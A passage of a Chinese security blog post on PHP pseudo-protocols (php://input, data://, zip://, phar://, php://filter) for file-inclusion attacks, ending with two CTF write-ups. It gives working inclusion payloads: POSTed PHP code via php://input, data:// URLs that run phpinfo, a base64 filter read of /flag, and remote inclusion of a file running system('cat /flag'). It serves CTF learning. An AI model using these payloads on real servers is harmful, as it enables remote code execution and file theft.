+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.convert.php">PHP: 转换过滤器 - Manual</a></p>
+</blockquote>
+<p><strong>压缩过滤器</strong></p>
+<p>压缩过滤器可以在网络的流中提供通用压缩，将一个非压缩的流转换成一个压缩流。可以在任何时候应用于任何流资源。</p>
+<blockquote>
+<p>官方文档：</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.compression.php">PHP: 压缩过滤器 - Manual</a></p>
+</blockquote>
+<p><strong>加密过滤器</strong>（已自 PHP 7.1.0 起废弃）</p>
+<p>加密过滤器特别适用于文件&#x2F;数据流的加密。</p>
+<blockquote>
+<p>官方文档：</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.encryption.php">PHP: 加密过滤器 - Manual</a></p>
+</blockquote>
+<p><strong>dechunk</strong></p>
+<p>将HTTP分块Chunk传输的数据进行解码</p>
+<blockquote>
+<p>HTTP分块Chunk传输：</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2399979">告别等待！HTTP分块Chunk传输让客户端响应更迅速数据即时呈现-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+</blockquote>
+<p>注：比较特别的是，进行解码的数据流<strong>每行都有后缀</strong><code>CRLF</code>（即<code>\r\n</code>），否则将得到空字符串</p>
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>主要用来接收post数据。</p>
+<p><strong>条件：</strong></p>
+<ul>
+<li>allow_url_fopen:off&#x2F;on</li>
+<li>allow_url_include :on</li>
+</ul>
+<p><strong>说明：</strong></p>
+<p>CTF中文件包含题目里，可以使用<code>php://input</code>协议，将post请求中的数据作为php代码执行。</p>
+<p><strong>使用示例</strong>：以传参变量名为file演示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[URL部分]</span><br><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line">[POST DATA部分]</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="zlib"><a href="#zlib" class="headerlink" title="zlib:&#x2F;&#x2F;"></a>zlib:&#x2F;&#x2F;</h2><p> 压缩流</p>
+<p><strong>条件</strong></p>
+<ul>
+<li>allow_url_fopen:off&#x2F;on</li>
+<li>allow_url_include :off&#x2F;on</li>
+</ul>
+<p><strong>作用</strong></p>
+<p>​	<code>zip://</code> &amp; <code>bzip2://</code> &amp; <code>zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，<strong>更重要的是不需要指定后缀名，可修改为任意后缀</strong>：jpg、png、gif等等。</p>
+<p><strong>注</strong>：<code>zlib://</code> 需要是服务器内的压缩包文件、但不局限于后缀名</p>
+<p><strong>示例：</strong></p>
+<p>1、 zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名]</p>
+<p><strong>注意：</strong><code>#</code>需要URL编码为<code>%23</code>，传入时不要加上<code>[ ]</code></p>
+<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传目录&#x2F;var&#x2F;www&#x2F;html&#x2F;，以file为文件包含的参数为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=zip:///var/www/html/phpinfo.jpg#phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<p>2、compress.bzip2:&#x2F;&#x2F;file.bz2<br>压缩 phpinfo.txt 为 phpinfo.bz2 并上传(同样支持任意后缀名)，并上传目录&#x2F;var&#x2F;www&#x2F;html&#x2F;，以file为文件包含的参数为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=compress.bzip2:///var/www/html/phpinfo.bz2</span><br></pre></td></tr></table></figure>
+
+<p>3、compress.zlib:&#x2F;&#x2F;file.gz<br>压缩 phpinfo.txt 为 phpinfo.gz 并上传(同样支持任意后缀名)，并上传目录&#x2F;var&#x2F;www&#x2F;html&#x2F;，以file为文件包含的参数为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=compress.zlib:///var/www/html/phpinfo.gz</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h2><p>phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似，同样可以访问zip格式压缩包内容</p>
+<p>例如,上传压缩包到目录&#x2F;var&#x2F;www&#x2F;html&#x2F;，以file为文件包含的参数为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=phar:///var/www/html/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><p><strong>条件</strong></p>
+<ul>
+<li>allow_url_fopen:on</li>
+<li>allow_url_include :on</li>
+</ul>
+<p><strong>作用</strong><br>自PHP&gt;&#x3D;5.2.0起，可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。<strong>通常可以用来执行PHP代码。</strong></p>
+<p><strong>用法</strong></p>
+<ul>
+<li><code>data://text/plain,[加上所需传输的经过url编码数据]</code></li>
+<li><code>data://text/plain;base64,[加上所需传输的经过base64编码再经过url编码的数据]</code></li>
+</ul>
+<p>注意：传入时不要加上<code>[ ]</code></p>
+<p><strong>示例</strong>：</p>
+<ul>
+<li>data:&#x2F;&#x2F;text&#x2F;plain,</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>data:&#x2F;&#x2F;text&#x2F;plain;base64,</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a><strong>使用场景</strong></h1><p>当遇到文件包含可使用伪协议进行</p>
+<p>可能遇到的文件包含函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">include</span><br><span class="line">require</span><br><span class="line">include_once</span><br><span class="line">require_once</span><br><span class="line">highlight_file</span><br><span class="line">show_source</span><br><span class="line">flie</span><br><span class="line">readfile</span><br><span class="line">file_get_contents </span><br><span class="line">file_put_contents</span><br><span class="line">fopen</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="include和require函数"><a href="#include和require函数" class="headerlink" title="include和require函数"></a>include和require函数</h2><p>​	通过 include 或 require 语句，可以将 <strong>PHP 文件</strong>的内容插入另一个 PHP 文件(<strong>在服务器执行它之前</strong>)。</p>
+<p><code>include</code> 和 <code>require</code> 语句是相同的，<strong>除了错误处理方面</strong>：</p>
+<p><code>require</code> 会生成致命错误(E_COMPILE_ERROR)并停止脚本、<code>include</code> 只生成警告(E_WARNING)，并且脚本会继续</p>
+<p><strong>语法：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;filename&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;filename&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>区别：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  include &#x27;23333.php&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>由于23333.php不存在<br>使用include的时候，只会在当前语句报错，然后执行后边的正常语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require</span> <span class="string">&#x27;23333.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是使用require的时候，就会直接报错然后跳出函数。</p>
+<h2 id="include-once和require-once函数"><a href="#include-once和require-once函数" class="headerlink" title="include_once和require_once函数"></a>include_once和require_once函数</h2><p>​	<code>include_once</code> (<code>require_once</code>)语句在脚本执行期间包含并运行指定文件。此行为和 <code>include (require)</code>语句类似，区别是如果该文件中的代码已经被包含了，则不会再次包含，只会包含一次。include_once(require_once)需要查询一遍已加载的文件列表, 确认是否存在, 然后再加载。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这种情况下1.php被包含两次。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这种情况下，第二次包含时，是不会进行包含的。</p>
+<h2 id="highlight-file-和show-source"><a href="#highlight-file-和show-source" class="headerlink" title="highlight_file()和show_source()"></a>highlight_file()和show_source()</h2><p>两个函数的用法相同，因为show_source()是highlight_file()的别名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(filename,<span class="keyword">return</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(filename,<span class="keyword">return</span>);</span><br></pre></td></tr></table></figure>
+
+<p>其中return是可选项</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>filename</td>
+<td>必需。要进行高亮处理的 PHP 文件的路径。</td>
+</tr>
+<tr>
+<td>return</td>
+<td>可选。如果设置 true，则本函数返回高亮处理的代码，而不是输出它们。</td>
+</tr>
+</tbody></table>
+<p>​	<br>​	</p>
+<h2 id="readfile和file-get-contents和file"><a href="#readfile和file-get-contents和file" class="headerlink" title="readfile和file_get_contents和file"></a>readfile和file_get_contents和file</h2><p>三者区别：</p>
+<table>
+<thead>
+<tr>
+<th align="center">名称</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">file</td>
+<td align="center">把整个文件读入一个数组中</td>
+</tr>
+<tr>
+<td align="center">readfile</td>
+<td align="center">读入一个文件并写入到输出缓冲。</td>
+</tr>
+<tr>
+<td align="center">file_get_contents</td>
+<td align="center">将整个文件读入一个字符串</td>
+</tr>
+</tbody></table>
+<p>注：以下提到的**PHP 的内置路径（include_path）**为在<code>php.ini</code>的php配置文件中进行设置的搜索路径。</p>
+<h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a><strong>file_get_contents</strong></h3><p>file_get_contents() 把整个文件读入一个字符串中。<br>该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>(path,include_path,context,start,max_length)</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>path</td>
+<td>必需。规定要读取的文件。</td>
+</tr>
+<tr>
+<td>include_path</td>
+<td>可选。只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）中搜索文件。如果您还想在 include_path(在 php.ini 中)中搜索文件的话，请设置该参数为 ‘1’。</td>
+</tr>
+<tr>
+<td>context</td>
+<td>可选。规定文件句柄的环境（即执行的条件）。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。</td>
+</tr>
+<tr>
+<td>start</td>
+<td>可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 中新增的。</td>
+</tr>
+<tr>
+<td>max_length</td>
+<td>可选。规定读取的字节数。该参数是 PHP 5.1 中新增的。</td>
+</tr>
+</tbody></table>
+<h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a><strong>readfile</strong></h3><p>readfile() 函数读取一个文件，并写入到输出缓冲。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>(filename,include_path,context)</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>filename</td>
+<td>必需。规定要读取的文件。</td>
+</tr>
+<tr>
+<td>include_path</td>
+<td>可选。只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）中搜索文件。如果您还想在 include_path(在 php.ini 中)中搜索文件的话，请设置该参数为 ‘1’。</td>
+</tr>
+<tr>
+<td>context</td>
+<td>可选。规定文件句柄的环境（即执行的条件）。context 是一套可以修改流的行为的选项。</td>
+</tr>
+</tbody></table>
+<h3 id="file-1"><a href="#file-1" class="headerlink" title="file"></a><strong>file</strong></h3><p>与 file_get_contents() 类似，不同的是 file() 将文件读取后作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file</span>(path,include_path,context)</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>path</td>
+<td>必需。规定要读取的文件</td>
+</tr>
+<tr>
+<td>include_path</td>
+<td>可选。只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）中搜索文件。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”</td>
+</tr>
+<tr>
+<td>context</td>
+<td>可选。规定文件句柄的环境（即执行的条件）。context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td>
+</tr>
+</tbody></table>
+<h2 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h2><p><code>file_put_contents()</code> 函数把一个字符串写入文件中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">file_put_contents</span> ( <span class="keyword">string</span> <span class="variable">$filename</span> , <span class="keyword">mixed</span> <span class="variable">$data</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> [, resource <span class="variable">$context</span> ]] )</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">参数</th>
+<th align="left">功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">filename</td>
+<td align="left">必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件</td>
+</tr>
+<tr>
+<td align="center">data</td>
+<td align="left">必需。规定要写入文件的数据。可以是字符串、数组或数据流</td>
+</tr>
+<tr>
+<td align="center">flag</td>
+<td align="left">可选。规定如何打开&#x2F;写入文件。可能的值：<br /> FILE_USE_INCLUDE_PATH ：只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）搜索文件。<br />FILE_APPEND：如果设置了该标志，数据将被追加到文件末尾而不是覆盖文件内容。<br /> LOCK_EX：如果设置了该标志，在写入文件时会获取一个独占锁定（排它锁），以防止其他进程同时写入文件。这可以确保在多个进程同时写入文件时不会发生冲突。</td>
+</tr>
+<tr>
+<td align="center">context</td>
+<td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。</td>
+</tr>
+</tbody></table>
+<p>该函数访问文件时，遵循以下<strong>顺序</strong>：	</p>
+<ol>
+<li>如果设置了 <code>FILE_USE_INCLUDE_PATH</code> 标志，函数将首先检查 <code>filename</code> 参数的副本是否存在于 PHP 的内置路径（include_path）中。</li>
+<li>函数将打开文件以进行写入操作。</li>
+<li>如果设置了 <code>LOCK_EX</code> 标志，函数将对文件进行锁定（获取独占锁定），以确保在写入文件时不会发生冲突。</li>
+<li>如果设置了 <code>FILE_APPEND</code> 标志，函数将将写入的数据追加到文件末尾。否则，函数将清除文件的内容并写入新的数据。</li>
+<li>函数将写入数据到文件中。</li>
+<li>函数将关闭文件并释放对文件的所有锁定。</li>
+</ol>
+<p>​	<br>​	</p>
+<h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p>fopen() 函数打开一个文件或 URL。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">fopen</span>(filename,mode,include_path,context)</span><br></pre></td></tr></table></figure>
+
+
+
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">filename</td>
+<td align="left">必需。规定要打开的文件或 URL。</td>
+</tr>
+<tr>
+<td align="left">mode</td>
+<td align="left">必需。规定您请求到该文件&#x2F;流的访问类型。可能的值：”r” （只读方式打开，将文件指针指向文件头）”r+” （读写方式打开，将文件指针指向文件头）”w” （写入方式打开，清除文件内容，如果文件不存在则尝试创建之）”w+” （读写方式打开，清除文件内容，如果文件不存在则尝试创建之）”a” （写入方式打开，将文件指针指向文件末尾进行写入，如果文件不存在则尝试创建之）”a+” （读写方式打开，通过将文件指针指向文件末尾进行写入来保存文件内容）”x” （创建一个新的文件并以写入方式打开，如果文件已存在则返回 FALSE 和一个错误）”x+” （创建一个新的文件并以读写方式打开，如果文件已存在则返回 FALSE 和一个错误）</td>
+</tr>
+<tr>
+<td align="left">include_path</td>
+<td align="left">可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 ‘1’。</td>
+</tr>
+<tr>
+<td align="left">context</td>
+<td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。</td>
+</tr>
+</tbody></table>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a><strong>实战</strong></h1><h2 id="No-1-土豆哥给的题目"><a href="#No-1-土豆哥给的题目" class="headerlink" title="No.1 土豆哥给的题目"></a><strong>No.1 土豆哥给的题目</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;easy lfi, but no flag~~&quot;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="comment">//flag in /flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&quot;first one:&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p><strong>土豆哥：flag一般在根目录下</strong><del>(根本没听到,做了很多无用功，但偶然接触到了一句话木马)</del></p>
+<p><strong>题解：</strong> </p>
+<p>​	<code>$cmd = preg_replace(&quot;/flag/i&quot;, &#39;&#39;, $cmd);</code>这个正则表达式用于删除cmd中含有<code>flag</code>地方，第二个  <code>if (preg_match(&quot;/flag/i&quot;, $cmd))</code>用来判断是否含有flag这个词如果有则进行if下的内容。</p>
+<p>​	按题目的含义我们可以构造出<code>flflagag</code>这个作为flag的替代</p>
+<p>​	尝试直接进行<code>cmd=/flflagag</code>进行传参，发现并没有出现参数，判读估计进行了隐藏。使用php中的<strong>php:&#x2F;&#x2F;filter</strong>伪协议进行读取，使用<code>cmd=php://filter/read=convert.base64-encode/resource=/flag</code>尝试使用base64加密后读取。</p>
+<p>​	页面出现经过base64加密后的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKJEZMQUcgPSAiUk9JU3tkb3Vkb3VibGVibGVfY21jbWRkX3dpd2lubn0iOw==</span><br></pre></td></tr></table></figure>
+
+<p>解密</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="string">&quot;ROIS&#123;doudoubleble_cmcmdd_wiwinn&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>发现flag是个变量无法直接通过include包含直接读出。</p>
+<h2 id="No-2-CTFHub-技能树-RCE-文件包含-远程包含"><a href="#No-2-CTFHub-技能树-RCE-文件包含-远程包含" class="headerlink" title="No.2 CTFHub 技能树-RCE-文件包含-远程包含"></a><strong>No.2 CTFHub 技能树-RCE-文件包含-远程包含</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don<span class="string">&#x27;t have shell, how to get flag?&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>页面给了个小提示</strong></p>
+<p><strong>phpinfo</strong></p>
+<table>
+<thead>
+<tr>
+<th>Directive</th>
+<th>Local Value</th>
+<th>Master Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>allow_url_fopen</td>
+<td>On</td>
+<td>On</td>
+</tr>
+<tr>
+<td>allow_url_include</td>
+<td>On</td>
+<td>On</td>
+</tr>
+</tbody></table>
+<p><strong>题解：</strong></p>
+<p>查看题目</p>
+<p>​	<code> if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;))</code>发现题目要求必须使用非含flag的文件进行包含，则此时可以考虑进行远程包含。在服务器上建立一个txt文件，里面写入能进行打印出根目录下flag的代码，如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用<code>http://</code>协议，最后成功获取代码</p>
+</article>
+<div class="article-footer">
+    <section id="references">
+      <div class="header"><span>参考资料</span></div>
+      <div class="body">
+        <ul>
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">PHP: 可用过滤器列表 - Manual</a></p>
+
+        </li>
+        
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-filesystem-fopen.html">PHP fopen() 函数</a></p>
+
+        </li>
+        </ul>
+      </div>
+    </section>
+    
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://wells.host/posts/b1f1aefc/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://wells.host/posts/b1f1aefc/&title=常见协议与PHP伪协议 - Wells's Blog&summary=常见协议与封装协议1234567891011121 file:// — 访问本地文件系统2 http:// — 访问 HTTP(s) 网址3 ftp:// — 访问 FTP(s) URLs4 php:// — 访问各个输入/输出流(I..."><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=常见协议与PHP伪协议 - Wells's Blog&amp;body=https://wells.host/posts/b1f1aefc/"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://wells.host/posts/b1f1aefc/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/posts/fe1aa8c3/">XSS</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/posts/e73517db/">SQL注入</a></div></section></div>
+
+
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body beaudar'>
+      
+
